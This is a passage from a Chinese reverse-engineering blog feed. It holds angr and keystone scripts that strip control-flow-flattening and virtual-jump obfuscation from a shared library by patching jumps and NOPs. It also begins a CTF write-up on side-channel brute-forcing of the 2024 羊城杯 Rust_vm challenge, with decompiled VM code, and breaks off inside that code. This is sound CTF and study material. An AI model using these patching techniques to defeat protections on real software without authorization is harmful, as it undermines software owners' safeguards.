new_cfg.in_degree(node) <span class="keyword">and</span> new_cfg.out_degree(node)]</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">            follows = <span class="built_in">list</span>(new_cfg.successors(node))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(node.addr)&#125;</span> --&gt; <span class="subst">&#123;[<span class="built_in">hex</span>(follow.addr) <span class="keyword">for</span> follow <span class="keyword">in</span> follows]&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(follows) == <span class="number">1</span>:</span><br><span class="line">                patch_addr = all_branches[node.addr][<span class="number">2</span>]</span><br><span class="line">                new_opcode = ks.asm(book[<span class="string">&#x27;jmp&#x27;</span>] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(follows[<span class="number">0</span>].addr), patch_addr)[<span class="number">0</span>]</span><br><span class="line">                origin[patch_addr - base:patch_addr - base + <span class="built_in">len</span>(new_opcode)] = new_opcode</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                patch_addr = all_branches[node.addr][<span class="number">0</span>]</span><br><span class="line">                end_addr   = all_branches[node.addr][<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># Fill the rest of the block with NOP</span></span><br><span class="line">                origin[patch_addr - base:end_addr - base] = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>] * ((end_addr - patch_addr) // <span class="built_in">len</span>(ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>]))</span><br><span class="line">                f1, f2 = follows[<span class="number">0</span>], follows[<span class="number">1</span>]</span><br><span class="line">                op1 = book[all_branches[node.addr][<span class="number">1</span>]] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(f1.addr)</span><br><span class="line">                new_opcode1 = ks.asm(op1, patch_addr)[<span class="number">0</span>]</span><br><span class="line">                op2 = book[<span class="string">&#x27;jmp&#x27;</span>] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(f2.addr)</span><br><span class="line">                new_opcode2 = ks.asm(op2, patch_addr + <span class="built_in">len</span>(new_opcode1))[<span class="number">0</span>]</span><br><span class="line">                origin[patch_addr - base:patch_addr - base + <span class="built_in">len</span>(new_opcode1 + new_opcode2)] = new_opcode1 + new_opcode2</span><br><span class="line">                <span class="comment"># print(f&#x27;&#123;hex(patch_addr)&#125; -- &#123;hex(patch_addr + len(new_opcode1 + new_opcode2))&#125; : &#123;bytes(new_opcode1 + new_opcode2)&#125;&#x27;)</span></span><br><span class="line">        <span class="comment"># Write the patched program</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_:</span><br><span class="line">            f_.write(<span class="built_in">bytes</span>(origin))</span><br></pre></td></tr></table></figure>



<h3 id="总结-后续打算"><a href="#总结-后续打算" class="headerlink" title="总结&amp;后续打算"></a>总结&amp;后续打算</h3><p>学到虚脱</p>
<p><del>把其他框架的也加进来增强兼容性</del>(24&#x2F;8&#x2F;20 已实现) 后面应该还会再用angr实现一下普通花指令的梭哈和绕过虚拟控制流</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a></li>
<li><a href="https://34r7hm4n.me/0x401RevTrain-Tools/angr/10_%E5%88%A9%E7%94%A8angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">https://34r7hm4n.me/0x401RevTrain-Tools/angr/10_%E5%88%A9%E7%94%A8angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/</a></li>
<li><a href="https://izayoishiki.github.io/">https://izayoishiki.github.io</a> (请视奸他)</li>
</ol>
<h2 id="用Angr实现去虚拟跳转-控制流"><a href="#用Angr实现去虚拟跳转-控制流" class="headerlink" title="用Angr实现去虚拟跳转 &#x2F; 控制流"></a>用Angr实现去虚拟跳转 &#x2F; 控制流</h2><p>实际上虚拟跳转比虚拟控制流要容易去除 因为IDA在硬编码中间数的前提下IDA可以直接计算出最终跳转的结果 例如:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F11%2F20240911-145913.png" alt="image-20240911145906286"></p>
<p>但是使用Angr来去除虚拟跳转 &#x2F; 控制流可以不用考虑那么多 只需要当作弱化的控制流平坦化处理就行 直接找到虚拟跳转的特征结构:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F11%2F20240911-151216.png" alt="image-20240911151216660"></p>
<p>据此确定要开始符号执行的位置 虚拟跳转目标的计算和原程序控制流是完全没有关系的 可以直接从特征结构的头开始符号执行:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proj = angr.Project(<span class="string">&#x27;fix2.so&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">ks = KSS[proj.arch.name]</span><br><span class="line">bias = -<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">func_block = proj.factory.block(addr=start, size=end-start+<span class="number">1</span>)</span><br><span class="line">to_patch = []</span><br><span class="line"><span class="keyword">for</span> ins <span class="keyword">in</span> func_block.capstone.insns:</span><br><span class="line">    <span class="keyword">if</span> ins.insn.mnemonic == <span class="string">&#x27;bl&#x27;</span>:</span><br><span class="line">        proj.hook(<span class="built_in">int</span>(ins.op_str[<span class="number">3</span>:], <span class="number">16</span>), angr.SIM_PROCEDURES[<span class="string">&quot;stubs&quot;</span>][<span class="string">&quot;ReturnUnconstrained&quot;</span>](), replace=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins.insn.op_str.startswith(<span class="string">&#x27;pc&#x27;</span>):</span><br><span class="line">        to_patch.append(ins.address)</span><br></pre></td></tr></table></figure>

<p>然后进行记录跳转后的地址进行patch即可:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch_addr = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> to_patch:</span><br><span class="line">    state = proj.factory.blank_state(addr = addr + bias, remove_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    <span class="keyword">while</span> simgr.active[<span class="number">0</span>].addr != addr:</span><br><span class="line">        simgr.step(num_inst=<span class="number">1</span>)</span><br><span class="line">    simgr.step(num_inst=<span class="number">1</span>)</span><br><span class="line">    to_jmp = simgr.active[<span class="number">0</span>].addr</span><br><span class="line">    patch_addr[addr] = to_jmp</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;fix.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    base = <span class="number">0x400001</span></span><br><span class="line">    NOP = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> addr, jmp <span class="keyword">in</span> patch_addr.items():</span><br><span class="line">        data[addr - base + bias:addr - base] = NOP * (<span class="built_in">abs</span>(bias) // <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Fill <span class="subst">&#123;<span class="built_in">hex</span>(addr - base + bias)&#125;</span> to <span class="subst">&#123;<span class="built_in">hex</span>(addr - base)&#125;</span> with NOP(<span class="subst">&#123;<span class="built_in">abs</span>(bias) // <span class="number">2</span>&#125;</span>)&#x27;</span>)</span><br><span class="line">        opcode = ks.asm(<span class="string">f&#x27;b <span class="subst">&#123;<span class="built_in">hex</span>(jmp)&#125;</span>&#x27;</span>, addr + bias)[<span class="number">0</span>]</span><br><span class="line">        data[addr - base + bias:addr - base + bias + <span class="built_in">len</span>(opcode)] = opcode</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Patched <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(jmp)&#125;</span>&#x27;</span>)</span><br><span class="line">    fix_so = <span class="built_in">open</span>(<span class="string">&#x27;fix.so&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    fix_so.write(data)</span><br><span class="line">    fix_so.close()</span><br></pre></td></tr></table></figure>

<p>完整代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, logging</span><br><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> ks</span><br><span class="line"><span class="keyword">import</span> capstone <span class="keyword">as</span> cs</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr&#x27;</span>).setLevel(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">start, end = <span class="number">0x401700</span>, <span class="number">0x40290C</span></span><br><span class="line">KSS = &#123;<span class="string">&#x27;AMD64&#x27;</span> : ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64), <span class="string">&#x27;ARMEL&#x27;</span> : ks.Ks(ks.KS_ARCH_ARM, ks.KS_MODE_THUMB), <span class="string">&#x27;X86&#x27;</span> : ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)&#125;</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;fix2.so&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">ks = KSS[proj.arch.name]</span><br><span class="line">bias = -<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">func_block = proj.factory.block(addr=start, size=end-start+<span class="number">1</span>)</span><br><span class="line">to_patch = []</span><br><span class="line"><span class="keyword">for</span> ins <span class="keyword">in</span> func_block.capstone.insns:</span><br><span class="line">    <span class="keyword">if</span> ins.insn.mnemonic == <span class="string">&#x27;bl&#x27;</span>:</span><br><span class="line">        proj.hook(<span class="built_in">int</span>(ins.op_str[<span class="number">3</span>:], <span class="number">16</span>), angr.SIM_PROCEDURES[<span class="string">&quot;stubs&quot;</span>][<span class="string">&quot;ReturnUnconstrained&quot;</span>](), replace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># print(f&#x27;Hooked &#123;hex(int(ins.op_str[3:], 16))&#125;&#x27;)</span></span><br><span class="line">    <span class="keyword">elif</span> ins.insn.op_str.startswith(<span class="string">&#x27;pc&#x27;</span>):</span><br><span class="line">        to_patch.append(ins.address)</span><br><span class="line">        <span class="comment"># print(f&#x27;Virtual jmp at: &#123;hex(ins.address)&#125;&#x27;)</span></span><br><span class="line">patch_addr = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> to_patch:</span><br><span class="line">    state = proj.factory.blank_state(addr = addr + bias, remove_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    <span class="keyword">while</span> simgr.active[<span class="number">0</span>].addr != addr:</span><br><span class="line">        simgr.step(num_inst=<span class="number">1</span>)</span><br><span class="line">    simgr.step(num_inst=<span class="number">1</span>)</span><br><span class="line">    to_jmp = simgr.active[<span class="number">0</span>].addr</span><br><span class="line">    patch_addr[addr] = to_jmp</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;fix.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    base = <span class="number">0x400001</span></span><br><span class="line">    NOP = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> addr, jmp <span class="keyword">in</span> patch_addr.items():</span><br><span class="line">        data[addr - base + bias:addr - base] = NOP * (<span class="built_in">abs</span>(bias) // <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Fill <span class="subst">&#123;<span class="built_in">hex</span>(addr - base + bias)&#125;</span> to <span class="subst">&#123;<span class="built_in">hex</span>(addr - base)&#125;</span> with NOP(<span class="subst">&#123;<span class="built_in">abs</span>(bias) // <span class="number">2</span>&#125;</span>)&#x27;</span>)</span><br><span class="line">        opcode = ks.asm(<span class="string">f&#x27;b <span class="subst">&#123;<span class="built_in">hex</span>(jmp)&#125;</span>&#x27;</span>, addr + bias)[<span class="number">0</span>]</span><br><span class="line">        data[addr - base + bias:addr - base + bias + <span class="built_in">len</span>(opcode)] = opcode</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Patched <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(jmp)&#125;</span>&#x27;</span>)</span><br><span class="line">    fix_so = <span class="built_in">open</span>(<span class="string">&#x27;fix.so&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    fix_so.write(data)</span><br><span class="line">    fix_so.close()</span><br></pre></td></tr></table></figure>



<p>修复前后:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_1700</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+8h] [bp-E8h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [sp+Ch] [bp-E4h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+10h] [bp-E0h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+14h] [bp-DCh]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [sp+1Ch] [bp-D4h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+28h] [bp-C8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = &amp;v7;</span><br><span class="line">  v3 = a3;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v8 = <span class="number">1066412143</span>;</span><br><span class="line">  __asm &#123; MOV             PC, R0; loc_174C &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1700</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="type">int</span> v93; <span class="comment">// [sp+DCh] [bp-14h]</span></span><br><span class="line">  _BYTE *v94; <span class="comment">// [sp+E0h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v48 = &amp;v52;</span><br><span class="line">  v47 = a3;</span><br><span class="line">  v49 = a2;</span><br><span class="line">  v50 = a1;</span><br><span class="line">  v54 = <span class="number">1066412143</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _stack_chk_guard;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>侧信道攻击</title>
    <url>/2024/08/29/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>侧信道攻击最原始的想法是直接对程序输入数据进行爆破测试 例如羊城杯2024逆向的Rust-VM:</p>
<span id="more"></span>

<p>(虽然这并不是侧信道攻击的前置知识 但是不妨碍我把它当成能联想到侧信道的最原始的想法()</p>
<h2 id="2024-羊城杯-Rust-vm"><a href="#2024-羊城杯-Rust-vm" class="headerlink" title="[2024 羊城杯]-Rust_vm"></a>[2024 羊城杯]-Rust_vm</h2><p>前面的第一步加密和主题的关系不大 直接跳过 只需要知道动调出来的结果是将输入的内容进行base64第一步编码 即将输入数据(flag包裹的内容 长度为32bytes)分割为6bits 最后长度是44bytes 重要的是接下来的虚拟机过程:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F29%2F20240829-110246.png" alt="image-20240829110239568"></p>
<p>可以看到处理函数调用了22次 并且每次处理2bytes数据 这时候就应该敏感的察觉到爆破的可能性 而虚拟机内部:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">proc</span><span class="params">(__int64 OPCODES_REGS, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// r9</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// al</span></span><br><span class="line">  __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// r12d</span></span><br><span class="line">  __int64 v12; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// r13</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">bool</span> v18; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v19; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v20; <span class="comment">// bp</span></span><br><span class="line">  __int64 v21; <span class="comment">// r12</span></span><br><span class="line">  __int64 v22; <span class="comment">// r15</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// bp</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v27; <span class="comment">// al</span></span><br><span class="line">  __int64 v28; <span class="comment">// r15</span></span><br><span class="line">  __int64 v29; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// r14d</span></span><br><span class="line">  __int64 v31; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v33; <span class="comment">// r10</span></span><br><span class="line">  __int64 v34; <span class="comment">// rax</span></span><br><span class="line">  __int64 v35; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v36; <span class="comment">// r9</span></span><br><span class="line">  __int64 v37; <span class="comment">// rax</span></span><br><span class="line">  __int64 v38; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v39; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v40; <span class="comment">// bp</span></span><br><span class="line">  __int64 v41; <span class="comment">// rax</span></span><br><span class="line">  __int64 v42; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v43; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v44; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// [rsp-7Ch] [rbp-124h]</span></span><br><span class="line">  __int64 v46; <span class="comment">// [rsp-78h] [rbp-120h]</span></span><br><span class="line">  __int64 v47; <span class="comment">// [rsp-70h] [rbp-118h]</span></span><br><span class="line">  __int64 v48; <span class="comment">// [rsp-68h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// [rsp-5Ch] [rbp-104h]</span></span><br><span class="line">  __int64 v50; <span class="comment">// [rsp-58h] [rbp-100h]</span></span><br><span class="line">  __int64 v51; <span class="comment">// [rsp-50h] [rbp-F8h]</span></span><br><span class="line">  __int64 v52; <span class="comment">// [rsp-48h] [rbp-F0h]</span></span><br><span class="line"></span><br><span class="line">  v45 = a2;</span><br><span class="line">  v4 = (<span class="type">unsigned</span> __int8)a3;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)a3 &gt; <span class="number">3u</span> )</span><br><span class="line">    sub_403550((<span class="type">unsigned</span> __int8)a3, <span class="number">4LL</span>, &amp;off_442EF0);</span><br><span class="line">  v6 = a3;</span><br><span class="line">  v7 = a3 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">  v8 = a3 + (*((_BYTE *)&amp;v45 + v4) &gt;&gt; <span class="number">6</span>);</span><br><span class="line">  v9 = *((_BYTE *)&amp;v45 + v4) &amp; <span class="number">0x3F</span>;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v9;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (v8 &amp; <span class="number">3</span>) + <span class="number">1041</span>) = v9;</span><br><span class="line">  v10 = BYTE1(a3);</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(a3) &gt;= <span class="number">4u</span> )</span><br><span class="line">    sub_403550(BYTE1(a3), <span class="number">4LL</span>, &amp;off_442F08);</span><br><span class="line">  v11 = HIWORD(a3);</span><br><span class="line">  v12 = HIBYTE(a3);</span><br><span class="line">  v13 = *((_BYTE *)&amp;v45 + v10);</span><br><span class="line">  v46 = v7;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (((_BYTE)v7 + (v13 &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">3</span>) + <span class="number">1041</span>) = v13 &amp; <span class="number">0x3F</span>;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + (((<span class="type">unsigned</span> __int8)(<span class="number">65</span> * v11) &gt;&gt; <span class="number">5</span>) | <span class="number">1LL</span>) + <span class="number">1040</span>) = (<span class="number">65</span> * v11) &amp; <span class="number">0x3F</span>;</span><br><span class="line">  v14 = (<span class="number">65</span> * v12) &amp; <span class="number">0x3F</span>;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v14;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + (((<span class="type">unsigned</span> __int8)(<span class="number">65</span> * v12) &gt;&gt; <span class="number">5</span>) | <span class="number">1LL</span>) + <span class="number">1040</span>) = v14;</span><br><span class="line">  v15 = <span class="number">8</span> * v11 + <span class="number">2</span> * v12;</span><br><span class="line">  v16 = v12 &amp; <span class="number">3</span>;</span><br><span class="line">  v17 = (v15 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v18 = (v15 &amp; <span class="number">0x20</span>) != <span class="number">0</span>;</span><br><span class="line">  v50 = v15 &gt;&gt; <span class="number">6</span>;</span><br><span class="line">  v52 = (<span class="type">unsigned</span> __int8)v11;</span><br><span class="line">  v51 = v4;</span><br><span class="line">  <span class="keyword">switch</span> ( v15 &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v17 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v17 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v17 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v17 | (<span class="number">4</span> * v18)) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v16 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (v15 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v17 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v17 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v15 &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v48 = v6;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64, _QWORD))sub_40AA60)(OPCODES_REGS, v6, v11);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64, _QWORD))sub_40AA60)(OPCODES_REGS, v46, (<span class="type">unsigned</span> <span class="type">int</span>)v12);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v11 &gt;= <span class="number">4u</span> )</span><br><span class="line">    sub_403550((<span class="type">unsigned</span> __int8)v11, <span class="number">4LL</span>, &amp;off_442F20);</span><br><span class="line">  v47 = ((<span class="type">unsigned</span> __int8)(<span class="number">8</span> * v11 + <span class="number">2</span> * v12) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v19 = *((_BYTE *)&amp;v45 + (<span class="type">unsigned</span> __int8)v11);</span><br><span class="line">  v49 = <span class="number">2</span> * v11;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + ((<span class="number">2</span> * (_BYTE)v11) &amp; <span class="number">6</span>) + <span class="number">1041</span>) = v19 &amp; <span class="number">0x3F</span>;</span><br><span class="line">  v20 = *((_BYTE *)&amp;v45 + v12);</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v20 &amp; <span class="number">0x3F</span>;</span><br><span class="line">  v21 = <span class="number">2</span> * v16;</span><br><span class="line">  v22 = <span class="number">2</span> * v16 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1041</span>) = v20 &amp; <span class="number">0x3F</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (v19 &gt;&gt; <span class="number">6</span>) | <span class="number">0x20</span>u);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (v20 &gt;&gt; <span class="number">6</span>) | <span class="number">0x24</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( v50 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0LL</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + v21 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v22 + <span class="number">1040</span>);</span><br><span class="line">      v23 = (<span class="type">unsigned</span> __int8)v47;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v47 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v47 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + v22 + <span class="number">1040</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v23 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v47 + <span class="number">4</span> * v18) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v16 + <span class="number">1040</span>);</span><br><span class="line">LABEL_16:</span><br><span class="line">      v24 = v46;</span><br><span class="line">      v25 = v48;</span><br><span 